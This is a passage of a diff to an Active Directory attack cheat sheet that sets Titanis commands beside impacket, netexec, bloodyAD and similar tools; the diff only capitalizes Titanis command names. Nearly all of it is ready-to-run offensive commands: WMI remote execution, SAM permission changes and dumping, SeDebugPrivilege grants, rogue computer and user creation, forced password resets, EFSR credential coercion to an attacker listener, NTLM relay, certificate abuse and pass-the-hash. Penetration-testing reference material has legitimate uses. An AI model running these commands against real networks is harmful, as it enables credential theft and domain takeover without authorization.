+Lsa lookupname 192.168.1.10 -UserName jdoe -Password Password123 Administrator jdoe
 ```
 
 [↑ Back to Index](#index)
@@ -1555,7 +1555,7 @@ rpcdump.py DOMAIN/jdoe:Password123@192.168.1.10
 rpcmap.py ncacn_ip_tcp:192.168.1.10
 
 # Titanis
-epm lsep 192.168.1.10
+Epm lsep 192.168.1.10
 ```
 
 [↑ Back to Index](#index)
@@ -1580,9 +1580,9 @@ netexec smb 192.168.1.10 -u jdoe -H A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 \
   --wmi "SELECT * FROM Win32_Process"
 
 # Titanis
-wmi query 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
+Wmi query 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
   "SELECT * FROM Win32_Process"
-wmi query 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
+Wmi query 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
   -OutputFields Caption,ProcessId,ParentProcessId "SELECT * FROM Win32_Process"
 ```
 
@@ -1597,7 +1597,7 @@ wmi query 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
 wmiexec.py DOMAIN/jdoe:Password123@192.168.1.10 "calc.exe"
 
 # Titanis — invoke any WMI method directly
-wmi invoke 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
+Wmi invoke 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
   Win32_Process Create "calc.exe"
 ```
 
@@ -1616,7 +1616,7 @@ reg.py DOMAIN/jdoe:Password123@192.168.1.10 query \
 netexec smb 192.168.1.10 -u jdoe -p Password123 -x "reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v LsaCfgFlags"
 
 # Titanis — list key
-reg list 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
+Reg list 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
   HKLM/SOFTWARE/Microsoft/Windows/CurrentVersion
 
 # impacket — read a value
@@ -1624,7 +1624,7 @@ reg.py DOMAIN/jdoe:Password123@192.168.1.10 query \
   -keyName HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa -v LsaCfgFlags
 
 # Titanis — read a value
-reg get 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
+Reg get 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
   HKLM/SYSTEM/CurrentControlSet/Control/Lsa LsaCfgFlags
 
 # impacket — set a value
@@ -1632,7 +1632,7 @@ reg.py DOMAIN/jdoe:Password123@192.168.1.10 add \
   -keyName HKCU\\Software\\Test -v TestValue -vt REG_SZ -vd "TestData"
 
 # Titanis — set a value
-reg set 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
+Reg set 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
   HKCU/Software/Test sz:TestValue=TestData
 ```
 
@@ -1648,8 +1648,8 @@ rpcclient -U 'DOMAIN\jdoe%Password123' 192.168.1.10 -c "regetkeysecurity HKLM\\S
 rpcclient -U 'DOMAIN\jdoe%Password123' 192.168.1.10 -c "regsetsecurity HKLM\\SAM <SDDL>"
 
 # Titanis
-reg getsd 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 HKLM/SAM
-reg setsd 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
+Reg getsd 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 HKLM/SAM
+Reg setsd 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
   HKLM/SAM "O:BAG:SYD:(A;;KA;;;SY)"
 ```
 
@@ -1672,15 +1672,15 @@ asmbclient "smb+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.10"
 # smb> tasks
 
 # Titanis
-scm query 192.168.1.10 -UserName jdoe -Password Password123
+Scm query 192.168.1.10 -UserName jdoe -Password Password123
 
 # impacket — start / stop
 services.py DOMAIN/jdoe:Password123@192.168.1.10 start -name Spooler
 services.py DOMAIN/jdoe:Password123@192.168.1.10 stop  -name Spooler
 
 # Titanis — start / stop
-scm start 192.168.1.10 -UserName jdoe -Password Password123 Spooler
-scm stop  192.168.1.10 -UserName jdoe -Password Password123 Spooler
+Scm start 192.168.1.10 -UserName jdoe -Password Password123 Spooler
+Scm stop  192.168.1.10 -UserName jdoe -Password Password123 Spooler
 ```
 
 [↑ Back to Index](#index)
@@ -1699,9 +1699,9 @@ rpcclient -U 'DOMAIN\jdoe%Password123' 192.168.1.10 \
 # bloodyAD — no userRight subcommand; use rpcclient or Titanis for LSA privilege assignment
 
 # Titanis
-lsa addpriv      192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -ByName jdoe SeDebugPrivilege
-lsa rmpriv       192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -ByName jdoe SeDebugPrivilege
-lsa setsysaccess 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -ByName jdoe 0x20
+Lsa addpriv      192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -ByName jdoe SeDebugPrivilege
+Lsa rmpriv       192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -ByName jdoe SeDebugPrivilege
+Lsa setsysaccess 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -ByName jdoe 0x20
 ```
 
 [↑ Back to Index](#index)
@@ -1719,11 +1719,11 @@ rpcclient -U 'DOMAIN\jdoe%Password123' 192.168.1.10 -c "enumprivs"
 enum4linux-ng -P 192.168.1.10 -u jdoe -p Password123
 
 # Titanis
-lsa enumaccounts     192.168.1.10 -UserName jdoe@DOMAIN -Password Password123  # requires admin
-lsa enumprivaccounts 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -Privilege SeDebugPrivilege
-lsa getprivs         192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -ByName jdoe
-lsa getrights        192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -ByName jdoe
-lsa getsysaccess     192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -ByName jdoe
+Lsa enumaccounts     192.168.1.10 -UserName jdoe@DOMAIN -Password Password123  # requires admin
+Lsa enumprivaccounts 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -Privilege SeDebugPrivilege
+Lsa getprivs         192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -ByName jdoe
+Lsa getrights        192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -ByName jdoe
+Lsa getsysaccess     192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -ByName jdoe
 ```
 
 [↑ Back to Index](#index)
@@ -1761,8 +1761,8 @@ msldap "ldap+kerberos+ccache://DOMAIN\jdoe:@dc01.domain.local/?dc=192.168.1.1&cc
 msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1/?proxytype=socks5&proxyhost=127.0.0.1&proxyport=1080"
 
 # Titanis
-ldap search 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 "(objectClass=user)"
-ldap search 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 "(objectClass=computer)"
+Ldap search 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 "(objectClass=user)"
+Ldap search 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 "(objectClass=computer)"
 ```
 
 [↑ Back to Index](#index)
@@ -1784,20 +1784,20 @@ msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
 # msldap> trusts
 
 # Titanis — enumerate GPO containers
-ldap search 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
+Ldap search 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
   "(objectClass=groupPolicyContainer)" \
   -OutputFields displayName,gPCFileSysPath,versionNumber
 
 # Titanis — enumerate domain trusts
-ldap search 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
+Ldap search 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
   "(objectClass=trustedDomain)" \
   -OutputFields name,trustDirection,trustType,trustAttributes,flatName
 
 # Titanis — Kerberos auth variants
-ldap search dc01.domain.local -UserName jdoe@DOMAIN -Kdc 192.168.1.1 \
+Ldap search dc01.domain.local -UserName jdoe@DOMAIN -Kdc 192.168.1.1 \
   -Password Password123 "(objectClass=groupPolicyContainer)" \
   -OutputFields displayName,gPCFileSysPath
-ldap search dc01.domain.local -UserName jdoe@DOMAIN \
+Ldap search dc01.domain.local -UserName jdoe@DOMAIN \
   -TicketCache jdoe.ccache "(objectClass=trustedDomain)" -OutputFields *
 
 # ldapsearch — raw GPO objects
@@ -1828,15 +1828,15 @@ msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
 # msldap> unconstrained
 
 # Titanis — unconstrained
-ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
+Ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
   "(userAccountControl|=TrustedForDelegation)" -OutputFields *
 
 # Titanis — constrained
-ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
+Ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
   "(msDS-AllowedToDelegateTo=*)" -OutputFields *
 
 # Titanis — S4U2self only
-ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
+Ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
   "(userAccountControl|=TrustedForS4U2self)" -OutputFields *
 ```
 
@@ -1862,7 +1862,7 @@ netexec smb 192.168.1.1 -u jdoe -p Password123 -M add-computer -o NAME=EVILPC$ P
 bloodyAD -H 192.168.1.1 -d DOMAIN -u jdoe -p Password123 add computer EVILPC$ Password123!
 
 # Titanis
-ldap addcomputer 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 EVILPC$ Password123
+Ldap addcomputer 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 EVILPC$ Password123
 ```
 
 [↑ Back to Index](#index)
@@ -1886,7 +1886,7 @@ bloodyAD -H 192.168.1.1 -d DOMAIN -u jdoe -p :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 \
 net rpc user add newuser Password123! -U DOMAIN/jdoe%Password123 -S 192.168.1.10
 
 # Titanis
-ldap adduser 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 newuser Password123!
+Ldap adduser 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 newuser Password123!
 ```
 
 [↑ Back to Index](#index)
@@ -1948,7 +1948,7 @@ owneredit.py -action write -new-owner jdoe \
   DOMAIN/admin:AdminPass@192.168.1.1
 
 # Titanis — post-exploitation after ACE grant (force password reset)
-kerb setpw -UserName jdoe@DOMAIN -Kdc 192.168.1.1 -Password jdoePass \
+Kerb setpw -UserName jdoe@DOMAIN -Kdc 192.168.1.1 -Password jdoePass \
   targetuser@DOMAIN NewPass123
 ```
 
@@ -1972,7 +1972,7 @@ bloodyAD -H 192.168.1.1 -d DOMAIN -u jdoe -p Password123 \
   remove uac targetuser -f ACCOUNTDISABLE
 
 # Titanis
-ldap moduser 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
+Ldap moduser 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
   targetuser userAccountControl+=4194304
 ```
 
@@ -1986,11 +1986,11 @@ ldap moduser 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
 
 ```bash
 # MS-EFSR — single technique
-credcoerce 192.168.1.10 \\<listener-ip>\share \
+CredCoerce 192.168.1.10 \\<listener-ip>\share \
   -UserName jdoe@DOMAIN -Password Password123 -Techniques Efs.OpenFile
 
 # MS-EFSR — multiple techniques
-credcoerce 192.168.1.10 \\<listener-ip>\share \
+CredCoerce 192.168.1.10 \\<listener-ip>\share \
   -UserName jdoe@DOMAIN -Password Password123 \
   -Techniques Efs.OpenFile,Efs.EncryptFile,Efs.DecryptFile,\
   Efs.QueryUsersOnFile,Efs.QueryRecoveryAgents,Efs.FileKeyInfo,\
@@ -2025,7 +2025,7 @@ ntlmrelayx.py -tf targets.txt -smb2support
 ntlmrelayx.py -t ldaps://192.168.1.1 --delegate-access --escalate-user jdoe
 
 # Terminal 2 — trigger coercion
-credcoerce 192.168.1.10 \\<relay-listener-ip>\share \
+CredCoerce 192.168.1.10 \\<relay-listener-ip>\share \
   -UserName jdoe@DOMAIN -Password Password123 -Techniques Efs.OpenFile
 ```
 
@@ -2051,7 +2051,7 @@ openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -node
 openssl pkcs12 -export -out jdoe.pfx -inkey key.pem -in cert.pem -passout pass:Password123
 
 # Titanis
-cert selfcert -Subject CN=jdoe -PfxFileName jdoe.pfx
+Cert selfcert -Subject CN=jdoe -PfxFileName jdoe.pfx
 ```
 
 [↑ Back to Index](#index)
@@ -2076,13 +2076,13 @@ msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
 # msldap> certtemplates
 
 # Titanis — enumerate certificate templates
-ldap search 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
+Ldap search 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
   -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" \
   "(objectClass=pKICertificateTemplate)" \
   -OutputFields displayName,msPKI-Certificate-Name-Flag,msPKI-Enrollment-Flag,pKIExtendedKeyUsage
 
 # Titanis — enumerate Enterprise CAs
-ldap search 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
+Ldap search 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
   -SearchBase "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" \
   "(objectClass=pKIEnrollmentService)" \
   -OutputFields displayName,dNSHostName,certificateTemplates
@@ -2125,10 +2125,10 @@ minikerberos-getNTPKInit \
   "kerberos+pfx://DOMAIN\Administrator:@192.168.1.1?pfx=admin.pfx" admin_nt.txt
 
 # Step 4 — Titanis PTH with recovered hash
-wmi exec dc01.domain.local -UserName Administrator@DOMAIN -NtlmHash <recovered_nt> "whoami"
-smb2 ls \\dc01.domain.local\C$ -UserName Administrator -UserDomain DOMAIN \
+Wmi exec dc01.domain.local -UserName Administrator@DOMAIN -NtlmHash <recovered_nt> "whoami"
+Smb2Client ls \\dc01.domain.local\C$ -UserName Administrator -UserDomain DOMAIN \
   -NtlmHash <recovered_nt>
-reg dumpsam dc01.domain.local -UserName Administrator@DOMAIN -NtlmHash <recovered_nt>
+Reg dumpsam dc01.domain.local -UserName Administrator@DOMAIN -NtlmHash <recovered_nt>
 ```
 
 [↑ Back to Index](#index)
@@ -2172,9 +2172,9 @@ certsync -u jdoe -p Password123 -d DOMAIN.LOCAL -dc-ip 192.168.1.1 \
   -ns 192.168.1.1 -outputfile domain_hashes
 
 # Feed recovered hashes into Titanis PTH flows
-wmi exec dc01.domain.local -UserName Administrator@DOMAIN \
+Wmi exec dc01.domain.local -UserName Administrator@DOMAIN \
   -NtlmHash <recovered_nt> "whoami"
-smb2 ls \\dc01.domain.local\C$ -UserName Administrator@DOMAIN \
+Smb2Client ls \\dc01.domain.local\C$ -UserName Administrator@DOMAIN \
   -NtlmHash <recovered_nt>
 ```
 
